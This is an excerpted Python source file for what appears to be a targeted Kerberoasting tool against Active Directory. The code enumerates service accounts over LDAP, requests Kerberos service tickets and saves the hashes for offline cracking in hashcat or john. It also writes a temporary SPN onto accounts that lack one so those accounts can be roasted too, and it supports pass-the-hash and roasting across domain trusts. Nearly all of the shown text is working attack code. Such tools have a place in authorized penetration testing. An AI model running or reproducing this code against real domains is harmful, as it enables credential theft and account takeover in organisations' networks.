    ...
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName, password, domain, lmhash, nthash, aes_key, kdcHost
            )
    else:
        tgt = TGT["KDC_REP"]
        cipher = TGT["cipher"]
...
def init_ldap_connection(
    target, tls_version, use_kerberos, domain, username, password, lmhash="", nthash=""
):
    ...
    ldap_server = ldap3.Server(
        connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls
    )
    if use_kerberos:
...
def init_ldap_session(
    use_kerberos, use_ldaps, dc_ip, domain, username, password, lmhash, nthash
):
    ...
    if use_ldaps is True:
        ...
        return init_ldap_connection(
            target, None, use_kerberos, domain, username, password, lmhash, nthash
        )
...
def get_users_and_SPNs(ldap_session, domain, usernames=None):
    ...
    if usernames is not None:
        search_filters += (
            "(|" + "".join(["(sAMAccountName:=%s)" % u for u in usernames]) + ")"
        )
    search_filters += ")"
    ...
    for item in ldap_session.response:
        if "attributes" in item.keys():
            ...
            if "servicePrincipalName" in item["attributes"].keys():
                users[sAMAccountName]["spns"] = item["attributes"][
...
class Logger(object):
    ...
    def verbose(self, message):
        if self.verbosity >= 1:
            console.print(
                "{}[VERBOSE]{} {}".format("[blue]", "[/blue]", message), highlight=False
            )
...
def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Queries target domain for SPNs that are running under a user "
            "account and operate targeted Kerberoasting"
        )
    )
    parser.add_argument(
        "-v",
    ...
    parser.add_argument(
        ...
        "--target-domain",
        action="store",
        help="Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.",
    )
    parser.add_argument(
        "-U",
        "--users-file",
        help="File with user per line to test",
    )
    parser.add_argument(
        "--request-user",
        action="store",
        metavar="username",
        help="Requests TGS for the SPN associated to the user specified (just the username, no domain needed)",
    )
    parser.add_argument(
        "-o",
        "--output-file",
    ...
    parser.add_argument(
        ...
        default="hashcat",
        help='Output format (default is "hashcat", "john" prepends usernames)',
    )
    parser.add_argument(
        "--use-ldaps",
        action="store_true",
    ...
    parser.add_argument(
        "--only-abuse",
        action="store_true",
        help="Ignore accounts that already have an SPN and focus on targeted Kerberoasting",
    )
    parser.add_argument(
        "--no-abuse",
        action="store_true",
        help="Don't attempt targeted Kerberoasting",
    )
    parser.add_argument(
        "--dc-host",
        action="store",
        help="Hostname of the target, can be used if port 445 is blocked or if NTLM is disabled",
    )

    authconn = parser.add_argument_group("authentication & connection")
    authconn.add_argument(
        "--dc-ip",
        action="store",
        metavar="ip address",
        help=(
            "IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. "
            "If omitted it will use the domain part (FQDN) specified in the identity parameter"
        ),
    )
    authconn.add_argument(
        "-d",
    ...
    secret.add_argument(
        ...
        action="store_true",
        help=(
            "Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based "
    ...
    if (
        not args.use_kerberos
        and args.auth_aes_key is None
        and args.auth_hashes is None
        and args.auth_password is None
        and args.auth_username is None
    ):
...
def main():
    try:
        ...
        # First of all, we need to get a TGT for the user
        userName = Principal(
            args.auth_username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        ...
        for user in users:
            ...
            if len(users[user]["spns"]) != 0 and not args.only_abuse:
                ...
                krb5tgs = obtain_krb_hash(
                    TGT=TGT,
                    sAMAccountName=user,
                    target_domain=(
                        args.auth_domain
                        if args.target_domain is None
                        else args.target_domain
                    ),
                    kdc_host=args.dc_ip,
                )
                ...
                logger.debug(
                    "User (%s) has no SPN, attempting a targeted Kerberoasting now"
                    % user
                )
                temp_spn = "somerandom/spn"
                ldap_session.modify(
                    users[user]["dn"],
                    {"servicePrincipalName": [ldap3.MODIFY_REPLACE, [temp_spn]]},
                )
                try:
                    if ldap_session.result["result"] == 0:
                        ...
                        handle_result(
                            filename=args.output_file, result=krb5tgs, user=user
                        )
                        ldap_session.modify(
                            users[user]["dn"],
                            {"servicePrincipalName": [ldap3.MODIFY_REPLACE, []]},
                        )
                        if ldap_session.result["result"] == 0:
                            ...
                            if ldap_session.result["result"] == 50:
                                logger.error(
                                    "Could not modify (%s), the server reports insufficient rights"
                                    % user
                                )
                            elif ldap_session.result["result"] == 19:
                                logger.error(
                                    "Could not modify (%s), the server reports a constrained violation"
                                    % user
                                )
                            else:
